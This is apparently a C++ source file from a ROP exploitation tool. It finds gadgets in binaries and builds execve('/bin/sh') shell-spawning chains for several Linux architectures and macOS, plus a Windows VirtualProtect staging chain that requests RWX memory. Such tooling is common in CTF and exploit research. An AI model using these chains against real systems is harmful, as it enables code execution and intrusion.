#include "chain_builder.h"
#include "utils.h"
#include <iostream>
#include <iomanip>
#include <stdexcept>
#include <algorithm>
#include <map>
#include <optional>
#include <fstream>
#include <vector>

#if __has_include("parsers/elf_defs.h")
#include "parsers/elf_defs.h"
#elif __has_include("elf_defs.h")
#include "elf_defs.h"
#elif __has_include("core/parsers/elf_defs.h")
#include "core/parsers/elf_defs.h"
#endif

// ANSI escape codes for coloring
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_ORANGE  "\033[33m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

// Construct ChainBuilder.
// Note: When parser is nullptr (legacy or standalone unit test calls), container-level ABI metadata
// remains unverified. Chains built without parser metadata are not validated for ABI conformance.
// The production pipeline in main.cpp always supplies parser.get().
ChainBuilder::ChainBuilder(const std::vector<Gadget>& gadgets, const std::string& arch,
                           const std::string& fileType, const FileParser* parser)
    : rop_gadgets(gadgets), m_arch(arch), m_fileType(fileType), m_parser(parser) {}

// Find a gadget with a specific instruction and a return
std::optional<Gadget> ChainBuilder::findOptimalPopGadget(const std::string& reg) {
    if (m_arch == "aarch64" || m_arch == "arm64") {
        for (const auto& g : rop_gadgets) {
            if (g.instructions.size() == 3 &&
                g.instructions[0].mnemonic == "ldr" &&
                g.instructions[0].op_str.find(reg) == 0 &&
                g.instructions[1].mnemonic == "ldr" &&
                (g.instructions[1].op_str.find("x30") == 0 || g.instructions[1].op_str.find("lr") == 0) &&
                g.instructions[2].mnemonic == "ret") {
                Gadget res = g;
                res.target_register = reg;
                return res;
            }
        }
    } else if (m_arch == "riscv" || m_arch == "riscv32" || m_arch == "riscv64") {
        for (const auto& g : rop_gadgets) {
            if (g.instructions.size() == 4 &&
                (g.instructions[0].mnemonic == "ld" || g.instructions[0].mnemonic == "lw") &&
                g.instructions[0].op_str.find(reg) == 0 &&
                (g.instructions[1].mnemonic == "ld" || g.instructions[1].mnemonic == "lw") &&
                (g.instructions[1].op_str.find("ra") == 0 || g.instructions[1].op_str.find("x1") == 0) &&
                (g.instructions[2].mnemonic == "addi" || g.instructions[2].mnemonic == "add") &&
                g.instructions[3].mnemonic == "ret") {
                Gadget res = g;
                res.target_register = reg;
                return res;
            }
        }
    }

    // 1. First priority: exact 2-instruction gadget: "pop <reg> ; ret"
    for (const auto& g : rop_gadgets) {
        if (g.instructions.size() == 2 && 
            g.instructions[0].mnemonic == "pop" && 
            g.instructions[0].op_str == reg &&
            (g.instructions[1].mnemonic == "ret" || g.instructions[1].mnemonic == "retf")) {
            Gadget res = g;
            res.target_register = reg;
            if (res.assembly.empty()) res.assembly = "pop " + reg + " ; ret";
            return res;
        }
    }

    // 2. Second priority: any clean gadget ending with ret where pop <reg> is present, smallest size
    const Gadget* best_candidate = nullptr;
    for (const auto& g : rop_gadgets) {
        if (g.instructions.size() < 2) continue;
        if (!g.isTerminator()) continue;

        for (size_t i = 0; i < g.instructions.size() - 1; ++i) {
            if (g.instructions[i].mnemonic == "pop" && g.instructions[i].op_str == reg) {
                if (!best_candidate || g.instructions.size() < best_candidate->instructions.size()) {
                    best_candidate = &g;
                }
            }
        }
    }
    if (best_candidate) {
        Gadget res = *best_candidate;
        res.target_register = reg;
        return res;
    }

    // 3. Fallback substring search
    std::string pop_instruction = "pop " + reg + " ; ret";
    for (const auto& g : rop_gadgets) {
        if (g.toString().find(pop_instruction) != std::string::npos) {
            Gadget res = g;
            res.target_register = reg;
            return res;
        }
    }
    return std::nullopt;
}

std::optional<Gadget> ChainBuilder::findSpecificGadget(const std::string& instruction) {
    // For syscall, sysenter, int 0x80, svc #0, ecall - look for exact instruction
    if (instruction == "syscall" || instruction == "sysenter" || instruction == "int 0x80" || 
        instruction == "svc #0" || instruction == "ecall") {
        
        // Exact 1-instruction match (e.g. standalone syscall)
        for (const auto& g : rop_gadgets) {
            if (g.instructions.size() == 1) {
                std::string full_insn = g.instructions[0].mnemonic;
                if (!g.instructions[0].op_str.empty()) full_insn += " " + g.instructions[0].op_str;
                if (full_insn == instruction || g.instructions[0].mnemonic == instruction) {
                    Gadget res = g;
                    if (res.assembly.empty()) res.assembly = instruction;
                    return res;
                }
            }
        }

        // Gadget ending with the target instruction
        for (const auto& g : rop_gadgets) {
            if (!g.instructions.empty()) {
                std::string full_insn = g.instructions.back().mnemonic;
                if (!g.instructions.back().op_str.empty()) full_insn += " " + g.instructions.back().op_str;
                if (full_insn == instruction || g.instructions.back().mnemonic == instruction) {
                    Gadget res = g;
                    if (res.assembly.empty()) res.assembly = instruction;
                    return res;
                }
            }
        }
    }

    // Gadget containing target instruction that terminates
    for (const auto& g : rop_gadgets) {
        if (g.toString().find(instruction) != std::string::npos) {
            return g;
        }
    }
    return std::nullopt;
}

uint64_t ChainBuilder::findBinShAddress(const std::vector<MemoryRegion>& memoryRegions) {
    if (m_fileType == "PE") {
        return 0; // Avoid searching for Linux /bin/sh in Windows PE binaries
    }

    // First attempt: resolve /bin/sh via parser section mappings (handles ELF and Mach-O Preferred VAs)
    if (m_parser != nullptr && !m_parser->getFilePath().empty()) {
        std::ifstream file(m_parser->getFilePath(), std::ios::binary);
        if (file) {
            std::string target = "/bin/sh";
            for (const auto& sec : m_parser->getSections()) {
                if (sec.raw_size < target.size()) continue;
                file.seekg(sec.raw_offset, std::ios::beg);
                std::vector<char> sbuf(sec.raw_size);
                file.read(sbuf.data(), sec.raw_size);
                if (file.gcount() < static_cast<std::streamsize>(target.size())) continue;
                auto pos = std::search(sbuf.begin(), sbuf.end(), target.begin(), target.end());
                if (pos != sbuf.end()) {
                    size_t delta = std::distance(sbuf.begin(), pos);
                    return sec.virtual_address + delta;
                }
            }
        }
    }

    // Fallback: search memoryRegions
    for (const auto& region : memoryRegions) {
        std::ifstream file(region.path, std::ios::binary);
        if (!file) {
            std::cerr << "Warning: Could not open file " << region.path << std::endl;
            continue;
        }

        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<char> buffer(fileSize);
        file.read(buffer.data(), fileSize);

        std::string target = "/bin/sh";
        auto pos = std::search(buffer.begin(), buffer.end(), target.begin(), target.end());

        if (pos != buffer.end()) {
            size_t offset = std::distance(buffer.begin(), pos);
            if (m_parser != nullptr) {
                for (const auto& sec : m_parser->getSections()) {
                    if (sec.raw_size > 0 && offset >= sec.raw_offset && offset < sec.raw_offset + sec.raw_size) {
                        return sec.virtual_address + (offset - sec.raw_offset);
                    }
                }
            }
            return region.start + offset;
        }
    }
    return 0;
}

uint64_t ChainBuilder::findDarwinArgvAddress(uint64_t binsh_addr) {
    if (m_parser == nullptr || binsh_addr == 0 || m_parser->getFilePath().empty()) return 0;
    std::ifstream file(m_parser->getFilePath(), std::ios::binary);
    if (!file) return 0;

    for (const auto& sec : m_parser->getSections()) {
        if (sec.raw_size < 16) continue;
        if (sec.is_executable) continue;
        if (sec.name.rfind("__TEXT", 0) == 0) continue;
        if (sec.name.find("__cstring") != std::string::npos) continue;
        if ((sec.characteristics & 0xFF) == 0x2 /* S_CSTRING_LITERALS */) continue;
        if ((sec.characteristics & 0xFF) == 0x1 /* S_ZEROFILL */) continue;
        if (sec.name.rfind("__PAGEZERO", 0) == 0) continue;
        if (sec.segment_initprot != 0 && (sec.segment_initprot & 0x1 /* VM_PROT_READ */) == 0) {
            continue;
        }

        file.seekg(sec.raw_offset, std::ios::beg);
        std::vector<uint8_t> buffer(sec.raw_size);
        file.read(reinterpret_cast<char*>(buffer.data()), sec.raw_size);
        if (file.gcount() < static_cast<std::streamsize>(sec.raw_size)) continue;

        for (size_t delta = 0; delta + 16 <= sec.raw_size; delta += 8) {
            uint64_t ptr0 = 0, ptr1 = 0;
            std::memcpy(&ptr0, &buffer[delta], 8);
            std::memcpy(&ptr1, &buffer[delta + 8], 8);
            if (ptr0 == binsh_addr && ptr1 == 0) {
                return sec.virtual_address + delta;
            }
        }
    }
    return 0;
}

uint64_t ChainBuilder::findDarwinEnvpAddress() {
    if (m_parser == nullptr || m_parser->getFilePath().empty()) return 0;
    std::ifstream file(m_parser->getFilePath(), std::ios::binary);
    if (!file) return 0;

    // Resolve /bin/sh and argv address so we can explicitly protect against
    // selecting the NULL terminator belonging to the argv array
    uint64_t binsh_addr = findBinShAddress({});
    uint64_t argv_addr = (binsh_addr != 0) ? findDarwinArgvAddress(binsh_addr) : 0;

    for (const auto& sec : m_parser->getSections()) {
        if (sec.raw_size < 8) continue;
        if (sec.is_executable) continue;

        // 1. Exclude __TEXT segment and cstring/literal sections
        if (sec.name.rfind("__TEXT", 0) == 0) continue;
        if (sec.name.find("__cstring") != std::string::npos) continue;
        if ((sec.characteristics & 0xFF) == 0x2 /* S_CSTRING_LITERALS */) continue;
        if ((sec.characteristics & 0xFF) == 0x1 /* S_ZEROFILL */) continue;
        if (sec.name.rfind("__PAGEZERO", 0) == 0) continue;

        // 2. Require segment read permission
        if (sec.segment_initprot != 0 && (sec.segment_initprot & 0x1 /* VM_PROT_READ */) == 0) {
            continue;
        }

        // 3. Must be a regular data section (S_REGULAR = 0)
        if ((sec.characteristics & 0xFF) != 0 /* S_REGULAR */) continue;

        file.seekg(sec.raw_offset, std::ios::beg);
        std::vector<uint8_t> buffer(sec.raw_size);
        file.read(reinterpret_cast<char*>(buffer.data()), sec.raw_size);
        if (file.gcount() < static_cast<std::streamsize>(sec.raw_size)) continue;

        for (size_t delta = 0; delta + 8 <= sec.raw_size; delta += 8) {
            uint64_t cand_va = sec.virtual_address + delta;

            // Reject if candidate aliases into the argv array [argv_addr, argv_addr + 16)
            // (specifically argv_addr + 8 which is argv[1] NULL terminator)
            if (argv_addr != 0 && cand_va >= argv_addr && cand_va < argv_addr + 16) {
                continue;
            }

            if (binsh_addr != 0 && delta >= 8) {
                uint64_t prev_qword = 0;
                std::memcpy(&prev_qword, &buffer[delta - 8], 8);
                if (prev_qword == binsh_addr) {
                    continue; // Previous qword points to /bin/sh; this is an argv[1] NULL terminator
                }
            }

            uint64_t ptr0 = 0;
            std::memcpy(&ptr0, &buffer[delta], 8);
            if (ptr0 == 0) {
                return cand_va;
            }
        }
    }
    return 0;
}

ROPChain ChainBuilder::buildExecveChainInternal(uint64_t binsh_addr, uint64_t argv_addr, uint64_t envp_addr) {
    if (m_fileType == "PE") {
        auto pop_rcx = findOptimalPopGadget("rcx");
        auto pop_rdx = findOptimalPopGadget("rdx");
        auto pop_r8  = findOptimalPopGadget("r8");
        auto pop_r9  = findOptimalPopGadget("r9");
        auto shadow_adj = findSpecificGadget("add rsp, 0x20");

        std::vector<std::string> missing;
        if (!pop_rcx) missing.push_back("pop rcx ; ret (1st param / lpAddress)");
        if (!pop_rdx) missing.push_back("pop rdx ; ret (2nd param / dwSize)");
        if (!pop_r8)  missing.push_back("pop r8 ; ret (3rd param / flNewProtect)");
        if (!pop_r9)  missing.push_back("pop r9 ; ret (4th param / lpflOldProtect)");
        if (!shadow_adj) missing.push_back("add rsp, 0x20 ; ret (Win64 32-byte shadow space)");

        if (missing.empty()) {
            ROPChain chain;
            chain.add_step(*pop_rcx, 0x10000000, "Stage RCX (Arg 1: Target Memory Address)", ROPStepType::RegisterAssignment);
            chain.add_step(*pop_rdx, 0x1000, "Stage RDX (Arg 2: Size 4096 bytes)", ROPStepType::RegisterAssignment);
            chain.add_step(*pop_r8,  0x40, "Stage R8 (Arg 3: PAGE_EXECUTE_READWRITE 0x40)", ROPStepType::RegisterAssignment);
            chain.add_step(*pop_r9,  0x10001000, "Stage R9 (Arg 4: lpflOldProtect Scratch Address)", ROPStepType::RegisterAssignment);
            chain.add_step(*shadow_adj, "Reserve 32-byte (0x20) Win64 ABI shadow space", ROPStepType::StackAdjustment);
            return chain;
        } else {
            std::string diag = "Could not synthesize Windows x64 ROP chain for PE target.\n";
            diag += "    - Windows ABI Architecture: Microsoft x64 (Fastcall: RCX, RDX, R8, R9)\n";
            diag += "    - Shadow Space: 32 bytes (0x20) must be reserved on stack above return address\n";
            diag += "    - User-mode binaries dispatch via Win32 API imports (e.g. VirtualProtect/WinExec in KERNEL32.dll)\n";
            diag += "    - Win64 Staging Gadget Inspection: ";
            diag += "RCX=" + std::string(pop_rcx ? "FOUND" : "MISSING") + ", ";
            diag += "RDX=" + std::string(pop_rdx ? "FOUND" : "MISSING") + ", ";
            diag += "R8=" + std::string(pop_r8 ? "FOUND" : "MISSING") + ", ";
            diag += "R9=" + std::string(pop_r9 ? "FOUND" : "MISSING") + ", ";
            diag += "ShadowAdjust(add rsp, 0x20)=" + std::string(shadow_adj ? "FOUND" : "MISSING");
            throw std::runtime_error(diag);
        }
    }

    if (m_fileType == "Mach-O" && m_arch != "x86_64") {
        std::string diag = "Could not synthesize macOS ROP chain for non-x86_64 Mach-O target.\n";
        diag += "    - Apple Silicon (ARM64) uses X16 for syscall index with svc #0x80 and enforces Pointer Authentication (PAC)\n";
        diag += "    - Target binary lacks required dyld dynamic linker call stubs or register staging primitives.";
        throw std::runtime_error(diag);
    }

    if (m_fileType == "Mach-O" && m_arch == "x86_64") {
        auto pop_rdi_gadget = findOptimalPopGadget("rdi");
        auto pop_rsi_gadget = findOptimalPopGadget("rsi");
        auto pop_rdx_gadget = findOptimalPopGadget("rdx");
        auto pop_rax_gadget = findOptimalPopGadget("rax");
        auto syscall_gadget = findSpecificGadget("syscall");

        std::vector<std::string> missing;
        if (!pop_rdi_gadget) missing.push_back("pop rdi ; ret");
        if (!pop_rsi_gadget) missing.push_back("pop rsi ; ret");
        if (!pop_rdx_gadget) missing.push_back("pop rdx ; ret");
        if (!pop_rax_gadget) missing.push_back("pop rax ; ret");
        if (!syscall_gadget) missing.push_back("syscall");

        if (!missing.empty()) {
            std::string err = "Could not build Darwin execve chain. Missing required gadgets: ";
            for (size_t i = 0; i < missing.size(); ++i) {
                if (i > 0) err += ", ";
                err += missing[i];
            }
            throw std::runtime_error(err);
        }

        if (binsh_addr == 0 && m_parser != nullptr) {
            binsh_addr = findBinShAddress({});
        }
        if (binsh_addr == 0) {
            throw std::runtime_error("Could not find '/bin/sh' address for Darwin Mach-O chain synthesis.");
        }

        if (argv_addr == 0 && m_parser != nullptr) {
            argv_addr = findDarwinArgvAddress(binsh_addr);
        }
        if (argv_addr == 0) {
            throw std::runtime_error("Could not find valid argv array { path, NULL } for Darwin Mach-O chain synthesis.");
        }

        if (envp_addr == 0 && m_parser != nullptr) {
            envp_addr = findDarwinEnvpAddress();
        }
        if (envp_addr == 0) {
            throw std::runtime_error("Could not find valid envp array { NULL } for Darwin Mach-O chain synthesis.");
        }

        ROPChain chain;
        chain.add_step(*pop_rdi_gadget, binsh_addr, "Set RDI to /bin/sh address", ROPStepType::RegisterAssignment, "rdi");
        chain.add_step(*pop_rsi_gadget, argv_addr, "Set RSI to argv array address", ROPStepType::RegisterAssignment, "rsi");
        chain.add_step(*pop_rdx_gadget, envp_addr, "Set RDX to envp array address", ROPStepType::RegisterAssignment, "rdx");
        chain.add_step(*pop_rax_gadget, 0x200003BULL, "Set RAX to Darwin BSD syscall number 0x200003B (execve)", ROPStepType::SystemCallSetup, "rax");
        chain.add_step(*syscall_gadget, "Invoke execve syscall", ROPStepType::SystemCallExecution);
        return chain;
    }

    ROPChain chain;

    if (m_arch == "x86_64") {
        auto pop_rdi_gadget = findOptimalPopGadget("rdi");
        auto pop_rsi_gadget = findOptimalPopGadget("rsi");
        auto pop_rdx_gadget = findOptimalPopGadget("rdx");
        auto pop_rax_gadget = findOptimalPopGadget("rax");
        auto syscall_gadget = findSpecificGadget("syscall");

        std::vector<std::string> missing;
        if (!pop_rdi_gadget) missing.push_back("pop rdi ; ret");
        if (!pop_rsi_gadget) missing.push_back("pop rsi ; ret");
        if (!pop_rdx_gadget) missing.push_back("pop rdx ; ret");
        if (!pop_rax_gadget) missing.push_back("pop rax ; ret");
        if (!syscall_gadget) missing.push_back("syscall");

        if (missing.empty()) {
            chain.add_step(*pop_rdi_gadget, binsh_addr, "Set RDI to /bin/sh address", ROPStepType::RegisterAssignment, "rdi");
            chain.add_step(*pop_rsi_gadget, 0, "Set RSI to 0", ROPStepType::RegisterAssignment, "rsi");
            chain.add_step(*pop_rdx_gadget, 0, "Set RDX to 0", ROPStepType::RegisterAssignment, "rdx");
            chain.add_step(*pop_rax_gadget, 59, "Set RAX to syscall number 59 (execve)", ROPStepType::SystemCallSetup, "rax");
            chain.add_step(*syscall_gadget, "Invoke execve syscall", ROPStepType::SystemCallExecution);
            return chain;
        } else {
            std::string err = "Could not build execve chain. Missing required gadgets: ";
            for (size_t i = 0; i < missing.size(); ++i) {
                if (i > 0) err += ", ";
                err += missing[i];
            }
            throw std::runtime_error(err);
        }
    } else if (m_arch == "x86") {
        auto pop_eax_gadget = findOptimalPopGadget("eax");
        auto pop_ebx_gadget = findOptimalPopGadget("ebx");
        auto pop_ecx_gadget = findOptimalPopGadget("ecx");
        auto pop_edx_gadget = findOptimalPopGadget("edx");
        auto int80_gadget = findSpecificGadget("int 0x80");

        std::vector<std::string> missing;
        if (!pop_eax_gadget) missing.push_back("pop eax ; ret");
        if (!pop_ebx_gadget) missing.push_back("pop ebx ; ret");
        if (!pop_ecx_gadget) missing.push_back("pop ecx ; ret");
        if (!pop_edx_gadget) missing.push_back("pop edx ; ret");
        if (!int80_gadget) missing.push_back("int 0x80");

        if (missing.empty()) {
            chain.add_step(*pop_eax_gadget, 11, "Set EAX to syscall number 11 (execve)", ROPStepType::SystemCallSetup, "eax");
            chain.add_step(*pop_ebx_gadget, binsh_addr, "Set EBX to /bin/sh address", ROPStepType::RegisterAssignment, "ebx");
            chain.add_step(*pop_ecx_gadget, 0, "Set ECX to 0", ROPStepType::RegisterAssignment, "ecx");
            chain.add_step(*pop_edx_gadget, 0, "Set EDX to 0", ROPStepType::RegisterAssignment, "edx");
            chain.add_step(*int80_gadget, "Invoke int 0x80", ROPStepType::SystemCallExecution);
            return chain;
        } else {
            std::string err = "Could not build execve chain. Missing required gadgets: ";
            for (size_t i = 0; i < missing.size(); ++i) {
                if (i > 0) err += ", ";
                err += missing[i];
            }
            throw std::runtime_error(err);
        }
    } else if (m_arch == "aarch64" || m_arch == "arm64") {
        auto pop_x0_gadget = findOptimalPopGadget("x0");
        auto pop_x1_gadget = findOptimalPopGadget("x1");
        auto pop_x2_gadget = findOptimalPopGadget("x2");
        auto pop_x8_gadget = findOptimalPopGadget("x8");
        auto svc_gadget = findSpecificGadget("svc #0");

        std::vector<std::string> missing;
        if (!pop_x0_gadget) missing.push_back("pop x0");
        if (!pop_x1_gadget) missing.push_back("pop x1");
        if (!pop_x2_gadget) missing.push_back("pop x2");
        if (!pop_x8_gadget) missing.push_back("pop x8");
        if (!svc_gadget) missing.push_back("svc #0");

        if (missing.empty()) {
            chain.add_step(*pop_x0_gadget, binsh_addr, "Set X0 to /bin/sh address", ROPStepType::RegisterAssignment, "x0");
            chain.add_step(*pop_x1_gadget, 0, "Set X1 to 0", ROPStepType::RegisterAssignment, "x1");
            chain.add_step(*pop_x2_gadget, 0, "Set X2 to 0", ROPStepType::RegisterAssignment, "x2");
            chain.add_step(*pop_x8_gadget, 221, "Set X8 to syscall number 221 (execve)", ROPStepType::SystemCallSetup, "x8");
            chain.add_step(*svc_gadget, "Invoke execve syscall", ROPStepType::SystemCallExecution);
            return chain;
        } else {
            std::string err = "Could not build execve chain. Missing required gadgets: ";
            for (size_t i = 0; i < missing.size(); ++i) {
                if (i > 0) err += ", ";
                err += missing[i];
            }
            throw std::runtime_error(err);
        }
    } else if (m_arch == "armv7" || m_arch == "arm") {
        if (m_parser && m_parser->getBinaryType() == "ELF") {
            // Extract the EABI version using flags & EF_ARM_EABIMASK.
            // Accept only EF_ARM_EABI_VER1, VER2, VER3, VER4, and VER5.
            // Reject zero and every other unrecognized or unsupported version.
            uint32_t flags = m_parser->getElfFlags();
            uint32_t eabi_ver = flags & ropweaver::EF_ARM_EABIMASK;
            bool valid_eabi = (eabi_ver == ropweaver::EF_ARM_EABI_VER1 ||
                               eabi_ver == ropweaver::EF_ARM_EABI_VER2 ||
                               eabi_ver == ropweaver::EF_ARM_EABI_VER3 ||
                               eabi_ver == ropweaver::EF_ARM_EABI_VER4 ||
                               eabi_ver == ropweaver::EF_ARM_EABI_VER5);
            if (!valid_eabi) {
                throw std::runtime_error(
                    "Could not build execve chain. Target ARM binary has an unknown or unsupported ARM EABI version "
                    "(e_flags EABI version 0x" +
                    [&]() {
                        std::ostringstream ss;
                        ss << std::hex << (eabi_ver >> 24);
                        return ss.str();
                    }() + "). Automated chain synthesis requires verified ARM EABI "
                    "(EF_ARM_EABI_VER1-5 with R7 syscall dispatch).");
            }
            uint8_t osabi = m_parser->getOsAbi();
            if (osabi != ropweaver::ELFOSABI_NONE && osabi != ropweaver::ELFOSABI_GNU &&
                osabi != ropweaver::ELFOSABI_ARM_AEABI) {
                throw std::runtime_error(
                    "Could not build execve chain. Non-Linux ARM OSABI detected (EI_OSABI=" +
                    std::to_string(osabi) + "). Linux execve syscall conventions do not apply.");
            }
        }

        auto pop_r0_gadget = findOptimalPopGadget("r0");
        auto pop_r1_gadget = findOptimalPopGadget("r1");
        auto pop_r2_gadget = findOptimalPopGadget("r2");
        auto pop_r7_gadget = findOptimalPopGadget("r7");
        auto svc_gadget = findSpecificGadget("svc #0");

        std::vector<std::string> missing;
        if (!pop_r0_gadget) missing.push_back("pop r0");
        if (!pop_r1_gadget) missing.push_back("pop r1");
        if (!pop_r2_gadget) missing.push_back("pop r2");
        if (!pop_r7_gadget) missing.push_back("pop r7");
        if (!svc_gadget) missing.push_back("svc #0");

        if (missing.empty()) {
            chain.add_step(*pop_r0_gadget, binsh_addr, "Set R0 to /bin/sh address", ROPStepType::RegisterAssignment, "r0");
            chain.add_step(*pop_r1_gadget, 0, "Set R1 to 0", ROPStepType::RegisterAssignment, "r1");
            chain.add_step(*pop_r2_gadget, 0, "Set R2 to 0", ROPStepType::RegisterAssignment, "r2");
            chain.add_step(*pop_r7_gadget, 11, "Set R7 to syscall number 11 (execve)", ROPStepType::SystemCallSetup, "r7");
            chain.add_step(*svc_gadget, "Invoke execve syscall", ROPStepType::SystemCallExecution);
            return chain;
        } else {
            std::string err = "Could not build execve chain. Missing required gadgets: ";
            for (size_t i = 0; i < missing.size(); ++i) {
                if (i > 0) err += ", ";
                err += missing[i];
            }
            throw std::runtime_error(err);
        }
    } else if (m_arch == "riscv" || m_arch == "riscv32" || m_arch == "riscv64") {
        if (m_parser && m_parser->getBinaryType() == "ELF") {
            // Note on RISC-V ABI handling:
            // Standard Linux RISC-V toolchains typically emit binaries with EI_OSABI = ELFOSABI_NONE (0 / System V),
            // which is identical to the header produced by generic bare-metal toolchains (riscv64-unknown-elf).
            // Therefore, ELFOSABI_NONE remains an ambiguity, not definitive proof of Linux.
            // Bare-metal RISC-V binaries cannot be reliably detected from ELFOSABI_NONE alone without container introspection.
            // Here we accept ELFOSABI_NONE and ELFOSABI_GNU, while rejecting explicit bare-metal (ELFOSABI_STANDALONE)
            // and explicit non-Linux OSABIs (e.g. FreeBSD, OpenBSD).
            uint32_t flags = m_parser->getElfFlags();
            // Reject RVE embedded variant: only 16 registers, so A7 (X17) does not exist
            if (flags & ropweaver::EF_RISCV_RVE) {
                throw std::runtime_error(
                    "Could not build execve chain. Target RISC-V binary uses RVE embedded ABI "
                    "(16 registers; A7/X17 unavailable for Linux syscall convention).");
            }
            uint8_t osabi = m_parser->getOsAbi();
            if (osabi == ropweaver::ELFOSABI_STANDALONE) {
                throw std::runtime_error(
                    "Could not build execve chain. Target RISC-V binary has ELFOSABI_STANDALONE "
                    "(bare-metal embedded). Linux execve syscall ABI is not supported on bare-metal targets.");
            }
            if (osabi != ropweaver::ELFOSABI_NONE && osabi != ropweaver::ELFOSABI_GNU) {
                throw std::runtime_error(
                    "Could not build execve chain. Ambiguous or non-Linux RISC-V OSABI detected (EI_OSABI=" +
                    std::to_string(osabi) + "). Linux execve syscall conventions cannot be applied.");
            }
        }

        auto pop_a0_gadget = findOptimalPopGadget("a0");
        auto pop_a1_gadget = findOptimalPopGadget("a1");
        auto pop_a2_gadget = findOptimalPopGadget("a2");
        auto pop_a7_gadget = findOptimalPopGadget("a7");
        auto ecall_gadget = findSpecificGadget("ecall");

        std::vector<std::string> missing;
        if (!pop_a0_gadget) missing.push_back("pop a0");
        if (!pop_a1_gadget) missing.push_back("pop a1");
        if (!pop_a2_gadget) missing.push_back("pop a2");
        if (!pop_a7_gadget) missing.push_back("pop a7");
        if (!ecall_gadget) missing.push_back("ecall");

        if (missing.empty()) {
            chain.add_step(*pop_a0_gadget, binsh_addr, "Set A0 to /bin/sh address", ROPStepType::RegisterAssignment, "a0");
            chain.add_step(*pop_a1_gadget, 0, "Set A1 to 0", ROPStepType::RegisterAssignment, "a1");
            chain.add_step(*pop_a2_gadget, 0, "Set A2 to 0", ROPStepType::RegisterAssignment, "a2");
            chain.add_step(*pop_a7_gadget, 221, "Set A7 to syscall number 221 (execve)", ROPStepType::SystemCallSetup, "a7");
            chain.add_step(*ecall_gadget, "Invoke ecall", ROPStepType::SystemCallExecution);
            return chain;
        } else {
            std::string err = "Could not build execve chain. Missing required gadgets: ";
            for (size_t i = 0; i < missing.size(); ++i) {
                if (i > 0) err += ", ";
                err += missing[i];
            }
            throw std::runtime_error(err);
        }
    }

    throw std::runtime_error("Could not build execve chain. Architecture " + m_arch + " not supported for automated chain.");
}

ROPChain ChainBuilder::buildExecveChain(const std::vector<MemoryRegion>& memoryRegions) {
    uint64_t addr = findBinShAddress(memoryRegions);
    return buildExecveChainInternal(addr);
}

ROPChain ChainBuilder::buildExecveChain(uint64_t binsh_addr, uint64_t argv_addr, uint64_t envp_addr) {
    return buildExecveChainInternal(binsh_addr, argv_addr, envp_addr);
}
